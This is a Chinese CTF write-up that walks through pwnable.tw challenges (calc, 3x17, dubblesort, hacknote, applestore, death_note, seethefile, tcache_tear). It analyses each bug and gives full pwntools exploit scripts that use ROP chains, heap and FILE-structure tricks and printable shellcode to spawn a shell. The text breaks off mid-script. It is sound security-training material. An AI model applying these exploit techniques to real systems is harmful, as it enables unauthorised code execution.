接下来就是parse_expr的关键部分了，运算。 当处理到操作符是，判断是否为第一个操作符，是的话进入else，将当前操作符保存在operator[v7]中，也就是operator[0]，如果不是第一个操作符的话进入if条件。if的作用：保存当前操作符至operator数组中，并进行之前操作符所对应的运算，举个例子： 11+3-2 当处理到”+”时，由于这是第一个运算符，函数只是将其左值 “1” 保存至initpool[1]中，并将 “+” 保存至operator[0]中，然后继续循环。当处理到 “-“ 时，因为inipool中已经有两个值”1”和”3”，而且operator中也保存了一个值 “+” ，也就是说，此时两个数组中的情况为： 12initpool[0]=2,initpool[1]=1,initpool[2]=3operator[0]=&quot;+&quot; 将1和3进行加法运算并保存起来，这就是eval函数做的事 eval函数 eval函数将”1+3”的计算结果”4”保存在之前”1”的位置，也就是initpool[initpool[0]-1]=initpool[1]中，（注意，这里的保存位置iniptool[1]是由initpool[0]相对确定的），这样一来，情况就是这样的： 12initpool[0]=2,initpool[1]=4,initpool[2]=2operator[0]=&quot;+&quot;,operator[1]=&quot;-&quot; 函数接下来就会通过eval计算”4-2”，并将运算结果仍然保存在initpool[1]中。程序经过多次运算，最终会将计算结果输出给用户： 上图中，ebp+var_5A0为initpool[0]的位置，ebp+var_59C为initpool[1]的位置，因此，（注意）程序输入给用户的结果为： 1initpool[1+initpool[0]-1] = initpool[initpool[0]] 至此，程序的逻辑算是勉勉强强弄懂了，那么，漏洞在哪 呢？ 漏洞分析其实我不看writeup 过了一遍又遍的程序还是没能找到漏洞，漏洞就出现在上文提到注意的地方。 虽然eval函数看似每次都将算运结果放到了initpool[1]中去，但是实际上这个下标”1”是由initpool[0]-1得到的，上文也提到正常情况下initpool[0]固定等于2的，因此我们总能将计算结果放到initpool[1]中去，并且最终将结果输出给用户。如果 我们能控制initpool[0]的值呢？这样我们相当于能实现任意地址读写了。 我们回头去看一下initpool[0]的值是怎么确定的， 这一串代码的意思就是：若运算符左边的操作数存在，那么就将操作数放到initpool[initpool[0]+1]上并且initpool[0]++，所以，如果左边的操作数不存在呢，那么initpool[0]就不会+1，当解析到下一个操作符时，initpool[0]才加一，那么进入eval函数计算时就是这样的： 123比如输入+300的情况如下 initpool[0]=1,initpool[1]=300operator[0]=&quot;+&quot; 最终的计算结果会放到initpool[initpool[0]-1] == initpool[0]，也就是initpool[0]=301这样，通过畸形的运算式我们就能控制initpool[0]的值了，接下来只需要计算好返回地址跟initpool[0]的偏移就可以进行地址的读写了 接下来就是构造ROP链执行execve(&quot;/bin/sh&quot;,0,0)因为这里需要用到是的参数”/bin/sh”的地址，我的做法是泄漏出栈地址，往栈中写入”/bin/sh”，然后将”/bin/sh”的地址做为参数。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677# initpool -&gt; 0xffffc818 1(a)# 0xffffc81c result == 0xffffc81c + 4*(a-1)# 0xffffc820 count# 0xffffc824 #coding:utf-8from pwn import *# p = process('./calc')p = remote("chall.pwnable.tw","10100")context.log_level = 'debug'pop_eax = 0x0805c34b# pop_ebx = 0x080481d1pop_ecx_ebx = 0x080701d1pop_edx = 0x080701aaint_0x80 = 0x08049a21def exp(data): if data&gt;0: payload = '+' + str(data) else: payload = '-' + str(-data) return payloadp.recvuntil("=== Welcome to SECPROG calculator ===\n")# +361 :ret_addr# gdb.attach(p,"b *0x80493F2")# 0x8048F45 +# 0x8048F79 -p.sendline('+360')stack_addr = 0xffffffff + int(p.recvuntil('\n')[:-1],10) + 1print "stack_addr --&gt; " + hex(stack_addr)binsh_addr = stack_addr + 4print "binsh_addr --&gt; " + hex(binsh_addr)#pop_eax 11p.sendline('+361')data = pop_eax - int(p.recvuntil('\n')[:-1],10)p.sendline('+361' + exp(data))p.recv()p.sendline('+362')data = 11 - int(p.recvuntil('\n')[:-1],10)p.sendline('+362' + exp(data))p.recv()#pop_ecx_ebx 0,binsh_addrp.sendline('+363')data = pop_ecx_ebx - int(p.recvuntil('\n')[:-1],10)p.sendline('+363' + exp(data))p.recv()p.sendline('+364')data = 0 - int(p.recvuntil('\n')[:-1],10)p.sendline('+364' + exp(data))p.recv()p.sendline('+365')data = int(p.recvuntil('\n')[:-1],10)payload = 0xffffffff - binsh_addr + data + 1p.sendline('+365-' + str(payload))p.recv()#pop edx 0p.sendline('+366')data = pop_edx - int(p.recvuntil('\n')[:-1],10)p.sendline('+366' + exp(data))p.recv()p.sendline('+367')data = 0 - int(p.recvuntil('\n')[:-1],10)p.sendline('+367' + exp(data))p.recv()#int_0x80p.sendline('+368')data = int_0x80 - int(p.recvuntil('\n')[:-1],10)p.sendline('+368' + exp(data))p.recv()#/bin/sh\x00p.sendline('+369')data = 0x6e69622f - int(p.recvuntil('\n')[:-1],10)p.sendline('+369' + exp(data))p.recv()p.sendline('+370')data = 0x0068732f - int(p.recvuntil('\n')[:-1],10)p.sendline('+370' + exp(data))p.recv()p.interactive() 参考博客：https://www.tuicool.com/articles/VNzqea3 写得太好太详细了吧！ 3x17这也是一道很神奇的题，很巧妙，很佩服。 程序分析 程序很简单，任意地址写，且只能写一次，一开始看到这里我很开心，这不是送分嘛！但是……….但是，，一次的任意地址写，有啥用？我开始懵了，看了writeup 才发现触及到了我的知识盲区 程序在这时设置了参数byte_4b9330每次都加1 即使能够调用回到main函数也无法再次使用任意地址写这个功能。 漏洞分析很明显了就是任意地址写了，但是要怎么去用它呢。这里涉及到了一个新知识（对于我来说）有一个新东西叫做.fini_array,是程序执行完毕之势执行的函数，这个数组里存着两个函数地址，这个数组 的两个函数以倒序依次被 执行，我们可以通修改.fini_array的内容来控制程序的执行流，根据这个数组调用，可以找到实际调用函数的位置，（IDA中shift +F7 可查看所以段，可以快速找到.fini_array段） gdb下个断看一下这里的调用是干嘛的 可以看到rbp为0x4b40f0即.fini_array也就是arr[1]，继续调试，可以看到rbx变为0之后跟-1比较cmp不相等，因此次调用执行call[rbp+rbx*8+0],即调试arr[0]，刚好符合我们查到的：倒序调用，所以我们现在要做的就是修改.fini_array数组构造一个无循环疯狂加调main函数，这样参数byte_4b9330就会疯狂加1 ，最终会回到0(0xff + 1 -&gt; 0)，这样我们就可以再次用到任意地址写这个功能。 我的做法是将arr[1]改为main，arr[0]改为调用.fini_array的函数也就是0x402960，这样的效果就是，调用arr[1]进入了main函数，出来调用了arr[0]又过来调用arr[1]进入main函数，然后继续调用arr[0]来调用main………疯狂调用main。这样就能实现多次的任意地址写了，接下来就构造ROP链，实现系统调用execve(&#39;/bin/sh&#39;,0,0)。 要让这个循环停下来只需要在ROP链构造完成后让arr[0]为leave_ret_addr即可。 exp123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context.log_level = 'debug'# p = process('./3x17')p = remote("chall.pwnable.tw","10105")def write(addr,value): p.recvuntil(':') p.sendline(str(addr)) p.recvuntil(':') p.send(str(value))fini_array = 0x4b40f0main = 0x401b6dloop_call = 0x402960pop_rax = 0x41e4afleave_ret = 0x401c4bbinsh_addr = 0x4B9300pop_rdi = 0x401696pop_rdx = 0x446e35pop_rsi = 0x406c30syscall = 0x471db5# execve = 0x3b# rdi,rsi,rdx# write(binsh_addr, p64(0x68732f6e69622f))# pop_rdi binsh_addr# pop_rsi 0# pop_rdx 0# pop_rax 0x3b# syscallwrite(fini_array,p64(loop_call) + p64(main))# write(binsh_addr, p64(0x68732f6e69622f))write(binsh_addr,'/bin/sh\x00')write(fini_array + 0x10,p64(pop_rdi) + p64(binsh_addr))write(fini_array + 0x20,p64(pop_rsi) + p64(0))write(fini_array + 0x30,p64(pop_rdx) + p64(0))write(fini_array + 0x40,p64(pop_rax) + p64(0x3b))write(fini_array + 0x50,p64(syscall))# gdb.attach(p,"b *0x401c4b")write(fini_array,p64(leave_ret))p.interactive() 参考博客：https://ama2in9.top/2019/04/10/3x17/ dubblesort这题也很妙，程序保护全开，主要功能是实现一个冒泡排序 程序一开始会让你输入name，然后输出，但是因为buf没有初始化导致这里可以泄漏出地址，真实地址很容易就拿到了，但是怎么利用？接下来输入num进行排序。 这里v9并没有限制大小，所以可以输入无数多个数字，溢出很明显了，但是因为程序开启了canary，所以单纯的覆盖到ret并不可行。 通过测试发现单输入 +和-并不会覆盖栈上的值，所以可以通过在canary 位置输入+来绕过canary。接下来是sort的问题了，因为程序是将我们输入到栈上的数字进行排序再按从小到大的顺序写回到栈中去的，所以应该这样构造栈内容： 这样一来通过排序才不会打乱我们的栈布局，同时也刚好真实地址binsh_addr &gt; system_addr exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./dubblesort') elf = ELF('./dubblesort') libc = elf.libcelse: p = remote("chall.pwnable.tw","10101") elf = ELF('./dubblesort') libc = ELF('./libc_32.so.6')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) p.recvuntil(':')# debug(0xa1d)p.send('a'*0x19)p.recvuntil('a'*0x18)# addr = u32(p.recv(4))# print "addr --&gt; " + hex(addr)if local: libc_base = u32(p.recv(4))-0x1b2000 - 0x61else: libc_base = u32(p.recv(4))-0x1b0000 - 0x61print "libc_base --&gt; " + hex(libc_base)system = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()print "system --&gt; " + hex(system)print "binsh_addr --&gt; " + hex(binsh_addr)print "libc_system --&gt; " + hex(libc.symbols['system'])print "libc_binsh --&gt; " + hex(libc.search("/bin/sh").next())p.recvuntil(':')p.sendline(str(0x23))for i in range(0x18): p.recvuntil(': ') p.sendline('1')p.recvuntil(': ')# debug(0xa9a)p.sendline('+')for i in range(9): p.recvuntil(': ') p.sendline(str(system))p.recvuntil(':')# debug(0xa9a)p.sendline(str(binsh_addr))p.interactive() hacknote这是一道入门堆题，主要有3个功能，增加，删除，打印 1.增加功能可添加任意大小的堆块，并且程序会申请0x10大小的的堆来存放puts函数以及存放内容的堆地址，增加功能最多只能使用5次 2.删除功能，通过index搜索free掉两块堆块，但是free后并没有清空指针，可造成UAF 3.打印，调用存在堆中的puts函数打印内容，这里函数sub_804862B的参数是他本身ptr[v1](ptr[v1]) 漏洞利用有两种泄漏地址的做法：1、申请unsortbin范围的堆块，UAF打印出main_arena地址 ​ 2、puts出got表地址 先讲第一种：申请 chunk0 -&gt; unsortbin范围 ，chunk1 -&gt; fastbin 范围,chunk1是为了使chunk1 free时不合并到top chunk 去。free chunk0 ，再malloc(size(chunk0)) 这时chunk0会被申请出来，单写入一个回车（因为main_arena+48最低字节因定是0xb0），打印出chunk0的内容 -0x0a + 0xb0 - 48就是main_arena地址了。 这时候ptr数组是这样的，我们free掉chunk0,chunk1，fastbin中就会有两个大小为0x10的空闲块0x8753058 -&gt; 0x8753000 -&gt; NULL再申请chunk4大小小于0x10就可以申请到0x8753000为content块写入数据，这样就可以修改0x8753008的内容，将puts函数修改为system内容堆块地址修改成;sh\x00 这里涉及一个知识点：Linux连续执行多条命令：https://blog.csdn.net/freedom2028/article/details/7104131 上面也说到puts函数的参数其实是他本来，所以这们这里覆盖后其实是执行system(system) 所以需要;来过渡。 第二种 puts got表内容做法：先申请两个大小一样的chunk0,chunk1，大小任意，然后free掉，这时候fastbin上就有两个大小为0x10的堆指针，这两个指针其实都是用来控制chunk0,chunk1输出的，这时候申请一个大小小于0x10的chunk2，我们就能分配其中一个指针进行写操作，将chunk0内容指针修改为puts@got，打印出chunk0就可以得到puts的真实地址。得到真实地址后跟方法一做法差不多。free 掉chunk2，fastbin又会出现两个大小为0x10的堆指针，接下来就跟上面link操作一样了，将puts函数改为system，将chunk内容指针改为;sh，print 0就可以了 exp_1123456789101112131415161718192021222324252627282930313233343536373839404142434445# unsort_bin to link addressfrom pwn import *context.log_level = 'debug'p = process('./hacknote')elf = ELF('./hacknote')libc = elf.libcsd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(size,content): ru('choice :') sl('1') ru('size :') sl(str(size)) ru('Content :') sd(content)def delete(index): ru('choice :') sl('2') ru('Index :') sl(str(index))def show(index): ru('choice :') sl('3') ru('Index :') sl(str(index))add(64,'n0va')add(32,'rabbit')delete(0)add(64,'\n')show(2)main_arena = u32(rc(4))-0x0a + 0xb0 - 48print "main_arena --&gt; " + hex(main_arena)libc_base = main_arena - 0x1b2780print "libc_base --&gt; " + hex(libc_base)system_addr = libc_base + libc.symbols['system']# gdb.attach(p)delete(0)delete(1)add(8,p32(system_addr) + ';sh\x00')# gdb.attach(p,"b *0x804893D")show(0)# gdb.attach(p)p.interactive() exp_212345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# puts@got to link addressfrom pwn import *context.log_level = 'debug'p = process('./hacknote')# p = remote("chall.pwnable.tw","10102")elf = ELF('./hacknote')libc = elf.libc# libc = ELF('./libc_32.so.6')sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(size,content): ru('choice :') sl('1') ru('size :') sl(str(size)) ru('Content :') sd(content)def delete(index): ru('choice :') sl('2') ru('Index :') sl(str(index))def show(index): ru('choice :') sl('3') ru('Index :') sl(str(index))add(32,'abc')add(32,'n0va')delete(0)delete(1)# gdb.attach(p)add(8,p32(0x804862B) + p32(elf.got['puts']))gdb.attach(p)# gdb.attach(p,"b *0x080488D1")show(0)puts_addr = u32(rc(4))print "puts_addr --&gt; " + hex(puts_addr)libc_base = puts_addr - libc.symbols['puts']system_addr = libc_base + libc.symbols['system']binsh_addr = libc_base + libc.search("/bin/sh").next()delete(2)add(8,p32(system_addr) + ';sh\x00')# gdb.attach(p,"b *0x080488D1")show(0)# gdb.attach(p)p.interactive() applestore这题简直太有意思了，被秀了一脸，自己还是太菜了啊 程序是一个苹果商店，可以往购物车里面添加手机，总共有这5种 123451: iPhone 6 - $1992: iPhone 6 Plus - $2993: iPad Air 2 - $4994: iPad Mini 3 - $3995: iPod Touch - $199 也可以从购物车中把手机删掉，同时还有列出购物车手机和结账的功能，不过不管总共多少钱它都会告诉你&#39;Want to checkout? Maybe next time!&#39; add1234567891011121314151617181920212223242526272829303132333435363738394041unsigned int add()&#123; char **v1; // [esp+1Ch] [ebp-2Ch] char nptr; // [esp+26h] [ebp-22h] unsigned int v3; // [esp+3Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf("Device Number&gt; "); fflush(stdout); my_read(&amp;nptr, 0x15u); switch ( atoi(&amp;nptr) ) &#123; case 1: v1 = create((int)"iPhone 6", (char *)0xC7); insert((int)v1); goto LABEL_8; case 2: v1 = create((int)"iPhone 6 Plus", (char *)0x12B); insert((int)v1); goto LABEL_8; case 3: v1 = create((int)"iPad Air 2", (char *)0x1F3); insert((int)v1); goto LABEL_8; case 4: v1 = create((int)"iPad Mini 3", (char *)0x18F); insert((int)v1); goto LABEL_8; case 5: v1 = create((int)"iPod Touch", (char *)0xC7); insert((int)v1);LABEL_8: printf("You've put *%s* in your shopping cart.\n", *v1); puts("Brilliant! That's an amazing idea."); break; default: puts("Stop doing that. Idiot!"); break; &#125; return __readgsdword(0x14u) ^ v3;&#125; 按选择添加手机，主要由create跟insert函数完成 create12345678910111213char **__cdecl create(int a1, char *a2)&#123; char **v2; // eax char **v3; // ST1C_4 v2 = (char **)malloc(0x10u); v3 = v2; v2[1] = a2; asprintf(v2, "%s", a1); v3[2] = 0; v3[3] = 0; return v3;&#125; 申请一个堆块存储了名字跟价格 insert123456789101112int __cdecl insert(int a1)&#123; int result; // eax _DWORD *i; // [esp+Ch] [ebp-4h] for ( i = &amp;myCart; i[2]; i = (_DWORD *)i[2] ) ; i[2] = a1; result = a1; *(_DWORD *)(a1 + 12) = i; return result;&#125; 找到 i[2]为0的就将malloc挂在上面，其实就是形成了双链表 delete1234567891011121314151617181920212223242526272829303132333435unsigned int delete()&#123; signed int v1; // [esp+10h] [ebp-38h] _DWORD *v2; // [esp+14h] [ebp-34h] int v3; // [esp+18h] [ebp-30h] int v4; // [esp+1Ch] [ebp-2Ch] int v5; // [esp+20h] [ebp-28h] char nptr; // [esp+26h] [ebp-22h] unsigned int v7; // [esp+3Ch] [ebp-Ch] v7 = __readgsdword(0x14u); v1 = 1; v2 = (_DWORD *)dword_804B070; printf("Item Number&gt; "); fflush(stdout); my_read(&amp;nptr, 0x15u); v3 = atoi(&amp;nptr); while ( v2 ) &#123; if ( v1 == v3 ) &#123; v4 = v2[2]; // fd v5 = v2[3]; // bk if ( v5 ) *(_DWORD *)(v5 + 8) = v4; // bk-&gt;fd = fd if ( v4 ) *(_DWORD *)(v4 + 12) = v5; // fd-&gt;bk = bk printf("Remove %d:%s from your shopping cart.\n", v1, *v2); return __readgsdword(0x14u) ^ v7; &#125; ++v1; v2 = (_DWORD *)v2[2]; &#125; return __readgsdword(0x14u) ^ v7;&#125; 做的事是双链表的摘除，类似于unlink cart123456789101112131415161718192021222324252627int cart()&#123; signed int v0; // eax signed int v2; // [esp+18h] [ebp-30h] int v3; // [esp+1Ch] [ebp-2Ch] _DWORD *i; // [esp+20h] [ebp-28h] char buf; // [esp+26h] [ebp-22h] unsigned int v6; // [esp+3Ch] [ebp-Ch] v6 = __readgsdword(0x14u); v2 = 1; v3 = 0; printf("Let me check your cart. ok? (y/n) &gt; "); fflush(stdout); my_read(&amp;buf, 0x15u); if ( buf == 'y' ) &#123; puts("==== Cart ===="); for ( i = (_DWORD *)dword_804B070; i; i = (_DWORD *)i[2] ) &#123; v0 = v2++; printf("%d: %s - $%d\n", v0, *i, i[1]); v3 += i[1]; &#125; &#125; return v3;&#125; 遍历链表打印，一般可以用来泄漏地址 checkout一开始审计整个程序并没有发现有什么漏洞，申请的堆块也不能自由输入内容，并且整个程序也没有free函数，唯一输入的位置就是选择的时候输入到栈中，正常加入购物车的手机都是放在堆上的，但是在checkout中留了一个彩蛋，如果总金额达到7174就会向购物车加入一部iphone8，价格是1，而这就是漏洞点，这部iphone8的结构体不是放到堆上而在栈上的，在ebp-0x20位置 但是单单这个还不够，因为我们并不能随机地往结构体里写入内容，要看一下这个栈空间是否能被我们自用 在add,delete,cart函数中都可以控制到这个栈空间，而且my_read部分可以用’\x00’来分割，并不影响atoi运行 利用思路： 1、构造7174价格的购物车 199*6+299*20，这样第27个就是栈里的那块 2、利用cart函数泄漏地址，构造结构体如下，这样能同时得到libc和heap地址 1234-&gt; puts@got-&gt; prise (随意)-&gt; mycart+8(fd)-&gt; bk(随意) 3、泄漏栈地址，再次调用cart函数，构造结构体为 12-&gt; point to stack's heap addr以下随意 4、delete 位于栈上的结构体，双链表的摘除操作和结构体的可控制使我们获得一次任意地址写 12p-&gt;bk-&gt;fd = p-&gt;fd (bk[2] = fd)p-&gt;fd-&gt;bk = p-&gt;bk (fd[3] = bk) 修改ebp为asprintf@got + 0x22修改asprintf_got为$0\x00&#39;\x00，atoi@got为system(因为asprintf和atoi相邻所以可以直接覆盖过去) 起初的想法是直接修改atoi@got为system但是因为上面写入的规则会向system+12写入atoi@got+8而system+12为不可写段，所以程序会crash掉 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182#coding:utf-8from pwn import *local = 0if local: p = process('./applestore') elf = ELF('./applestore') libc = elf.libcelse: p = remote("") elf = ELF('./applestore') libc = elf.libccontext.log_level = 'debug'sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)def add(num): ru('&gt; ') sl('2') ru('&gt; ') sd(str(num))def delete(num): ru('&gt; ') sl('3') ru('&gt; ') sl(num)def cart(s): ru('&gt; ') sl('4') ru('&gt; ') sl(s)def checkout(): ru('&gt; ') sl('5') ru('&gt; ') sl('y')myCart = 0x804B068for i in range(6): add(1)for i in range(20): add(2)# gdb.attach(p,"b *0x8048C0B\nb *0x8048b86")checkout()# gdb.attach(p,"b *0x08048B17")pay = 'y\x00' + p32(elf.got['puts']) + p32(1) + p32(0x804b070)cart(pay)ru("27: ")puts_addr = u32(rc(4))ru("28: ")heap = u32(rc(4)) - 0x490libc_base = puts_addr - libc.symbols['puts']system = libc_base + libc.symbols['system']log.warn("puts_addr --&gt; %s",hex(puts_addr))log.warn("libc_base --&gt; %s",hex(libc_base))log.warn("system --&gt; %s",hex(system))log.warn("heap --&gt; %s",hex(heap))# heap + 0x8b0 --&gt; point to stackpay = 'y\x00' + p32(heap + 0x8b0) + p32(1) + p32(0)# gdb.attach(p,"b *0x08048AB9")cart(pay)ru("27: ")stack = u32(rc(4))ebp = stack + 0x20log.warn("stack --&gt; %s",hex(stack))log.warn("ebp --&gt; %s",hex(ebp))asprintf_got = elf.got['asprintf']atoi_got = elf.got['atoi']for i in range(25): #把前面碍事的堆块弄掉 delete('1')# gdb.attach(p,"b *0x080489E0")# gdb.attach(p,"b *0x08048C0B")pay = '2\x00' + p32(system) + p32(1) + p32(ebp - 0xc) + p32(asprintf_got + 0x22)delete(pay)ru("&gt; ")pay = "$0\x00\x00" + p32(system)sl(pay)p.interactive() death_note保护：got表可改，且存在RWX段，那应该是写shellcode了 123456Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments add函数 12345678910111213141516171819202122232425unsigned int add_note()&#123; int v1; // [esp+8h] [ebp-60h] char s; // [esp+Ch] [ebp-5Ch] unsigned int v3; // [esp+5Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf("Index :"); v1 = read_int(); if ( v1 &gt; 10 ) //下溢 &#123; puts("Out of bound !!"); exit(0); &#125; printf("Name :"); read_input(&amp;s, 0x50u); if ( !is_printable(&amp;s) ) &#123; puts("It must be a printable name !"); exit(-1); &#125; note[v1] = strdup(&amp;s); puts("Done !"); return __readgsdword(0x14u) ^ v3;&#125; 到下标没有检查下限，note在bss段上，所以可以覆写到got表，那么就可以直接写shellcode覆到got表执行，但是这里对输入有个要求is_printable必需是可打印的，也就是该题的考点，可打印shellcode 通常的shellcode都不满足可打印，所以要自己手写 根据某大牛博客中写到，此题可用的汇编打令如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768691.数据传送:push/pop eax…pusha/popa2.算术运算:inc/dec eax…sub al, 立即数sub byte ptr [eax… + 立即数], al dl…sub byte ptr [eax… + 立即数], ah dh…sub dword ptr [eax… + 立即数], esi edisub word ptr [eax… + 立即数], si disub al dl…, byte ptr [eax… + 立即数]sub ah dh…, byte ptr [eax… + 立即数]sub esi edi, dword ptr [eax… + 立即数]sub si di, word ptr [eax… + 立即数]3.逻辑运算:and al, 立即数and dword ptr [eax… + 立即数], esi ediand word ptr [eax… + 立即数], si diand ah dh…, byte ptr [ecx edx… + 立即数]and esi edi, dword ptr [eax… + 立即数]and si di, word ptr [eax… + 立即数]xor al, 立即数xor byte ptr [eax… + 立即数], al dl…xor byte ptr [eax… + 立即数], ah dh…xor dword ptr [eax… + 立即数], esi edixor word ptr [eax… + 立即数], si dixor al dl…, byte ptr [eax… + 立即数]xor ah dh…, byte ptr [eax… + 立即数]xor esi edi, dword ptr [eax… + 立即数]xor si di, word ptr [eax… + 立即数]4.比较指令:cmp al, 立即数cmp byte ptr [eax… + 立即数], al dl…cmp byte ptr [eax… + 立即数], ah dh…cmp dword ptr [eax… + 立即数], esi edicmp word ptr [eax… + 立即数], si dicmp al dl…, byte ptr [eax… + 立即数]cmp ah dh…, byte ptr [eax… + 立即数]cmp esi edi, dword ptr [eax… + 立即数]cmp si di, word ptr [eax… + 立即数]5.转移指令:push 56hpop eaxcmp al, 43hjnz lable&lt;=&gt; jmp lable6.交换al, ahpush eaxxor ah, byte ptr [esp] // ah ^= alxor byte ptr [esp], ah // al ^= ahxor ah, byte ptr [esp] // ah ^= alpop eax7.清零:push 44hpop eaxsub al, 44h ; eax = 0push esipush esppop eaxxor [eax], esi ; esi = 0 以上的汇编其机器码都是可见字符，所以我们要用以上的汇编编写shellcode 其实大概思路就是，mov a,b --&gt; push b;pop a;如int 0x80(80cd)的不可见的字节码就通过xor sub and运算操作shellcode使之变成int 0x80 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#coding:utf-8from pwn import *context.log_level = 'debug'# p = process('./death_note')p = remote("chall.pwnable.tw","10201")shellcode = ''' push 0x68 push 0x732f2f2f push 0x6e69622f push esp pop ebx push edx /*构建int 80*/ push 0x4f pop ecx push edx pop eax sub byte ptr[eax + 0x3a] , cl sub byte ptr[eax + 0x3a] , cl push 0x60 pop ecx sub byte ptr[eax + 0x3b] , cl sub byte ptr[eax + 0x3b] , cl /*构建完成 eax+0x39处为80cd(int 80)*/ /*edx=0*/ push 0x40 pop eax xor al,0x40 push eax pop edx /*eax=0xb*/ xor al, 0x40 xor al, 0x4b /*补全shellcode长度，到rax+3a也就是shellcode+3a处*/ push edx pop ecx push edx pop edx push edx pop edx push edx pop edx push edx pop edx push edx pop edx'''shellcode = asm(shellcode) + '\x6b\x40'print shellcodedef add(): p.recvuntil("choice :") p.sendline("1") p.recvuntil("Index :") p.sendline('-16') p.recvuntil("Name :") p.sendline(shellcode)# gdb.attach(p,"b *0x080487EF\nc\n")add()p.interactive() seethefile环境：ubuntu16；保护基本没开 程序功能： 123451、open:调用fopen打开指定文件，但是不能打开名为flag的文件，文件指针放在全局变量fp中2、read:根据fp读取0x18f字节到全局变量magicbuf中3、write:打印magicbuf中的内容，但是不能打印含&apos;flag&apos;,&apos;FLAG&apos;,&apos;&#125;&apos;的内容4、close:调用fclose关闭文件fp5、exit:可输入一串字符，存放在全局变量name中，且如果fp不为空，fclose(fp) 漏洞： 这是一道文件题，漏洞就出现在exit退出时输入的name，因为没有控制长度，所以存在溢出，而name下方就是fp，所以可以覆盖到fp； 利用： 所以思路就是构造fack FILE，从而使得fclose执行system(&#39;/bin/sh&#39;)，但是前提要先泄漏出libc，由于linux独特的文件形式存储，文件的内容信息储存在/proc/pid/maps中，这里的pid用self来代替，如下： 1234508048000-0804a000 r-xp 00000000 08:00 249799 /home/seethefile/seethefile0804a000-0804b000 r--p 00001000 08:00 249799 /home/seethefile/seethefile0804b000-0804c000 rw-p 00002000 08:00 249799 /home/seethefile/seethefile09e31000-09e53000 rw-p 00000000 00:00 0 [heap]f7540000-f754100 几个IO_FILE的知识： 12341、_IO_FILE结构大小为0x94,可能版本一样会有所不同？2、_flags&amp;0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp-&gt;vtable-&gt;_finish(fp)3、将fp指向一块内存p,p你让我懂0的前4个字节设置为0xffffdfff,p偏移4的位置放上参数&apos;;/bin/sh&apos;(字符要以;开头)；p偏移sizeof(_IO_FILE)大小位置(vtable)覆盖为内存q,q的2*4字节处(vtable-&gt;_finish)覆盖为system即可4、vtable是个虚标指针，里面一般性是21or23个变量，我们需要改的是第三个，别的填充些正常的地址就好 exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding:utf-8from pwn import *context.log_level = 'debug'local = 0if local: p = process('./seethefile') elf = ELF('./seethefile') libc = elf.libcelse: p = remote("chall.pwnable.tw","10200") elf = ELF('./seethefile') libc = ELF('./libc_32.so.6')#内存地址随机化def debug(addr,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda s:p.recv(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def open(): sla("choice :",'1') sla("see :",'/proc/self/maps')def show(): sla("choice :",'2') sla("choice :",'3')def close(): sla("choice :",'4')def exit(name): sla("choice :",'5') sla("name :",name)open()show()# show()ru("[heap]\n")libc_base = int(rc(8),16)+0x1000system = libc_base + libc.symbols['system']log.warn("libc_base --&gt; %s",hex(libc_base))log.warn("system --&gt; %s",hex(system))fack_vtable = 0x804B300pay = 0x20*'a' + p32(fack_vtable) + 'b'*0x7cpay += '\xff\xff\xdf\xff;/bin/sh\x00'.ljust(0x94,'\x00')pay += p32(fack_vtable+0x98)pay += p32(system)*21# gdb.attach(p,"b *0x08048B0F")exit(pay)sl("cd home/seethefile")sl("./get_flag")ru("Your magic :")sl("Give me the flag")# gdb.attach(p)p.interactive() tcache_tear环境：ubuntu18；保护除PIE个全开 123456Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) FORTIFY: Enabled 程序功能： 1234Name:输入到bss段1、malloc:通过malloc申请chunk，任意大小2、free:free ptr上的堆指针，没有清空ptr，存在UAF,只能free 7次，所以不能通过多次free将chunk放到unsorted bin中去3、info:打印name 思路：利用house_of_spirit释放name，只要name够大，就会直接放到unsorted bin，将main_arena+96写入到name中去，show获得地址；接下来再利用tcache将free_hook地址改写成system，free(‘/bin/sh\x00’) exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *context.log_level = 'debug'local = 0if local: p = process('./tcache_tear') elf = ELF('./tcache_tear') libc = elf.libcelse: p = remote("chall.pwnable.tw","10207") elf = ELF('./tcache_tear') libc = ELF('./libc.so)sd = lambda s:p.send(s)sl = lambda s:p.sendline(s)rc = lambda 